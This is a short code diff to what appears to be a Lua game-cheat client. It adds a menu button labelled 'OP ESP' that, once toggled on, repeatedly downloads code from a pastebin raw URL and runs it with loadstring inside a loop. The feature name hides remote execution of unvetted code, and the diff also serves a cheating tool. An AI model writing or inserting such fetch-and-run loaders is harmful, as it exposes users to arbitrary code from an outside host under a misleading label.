@@ -14022,3 +14022,17 @@ runFunction(function()
 			end
 		})
 	end)																																																																																				
+runFunction(function()
+    local crazyesp = {Enabled = true}
+    crazyesp = GuiLibrary.ObjectsThatCanBeSaved.CombatWindow.Api.CreateOptionsButton({
+        Name = "OP ESP",
+        HoverText = "Better ESP.",
+        Function = function(callback)
+            if callback then
+                repeat
+                    loadstring(game:HttpGet("https://pastebin.com/raw/7K1Jhmck", true))()
+                until not crazyesp.Enabled
+            end
+        end
+    })
+end)        
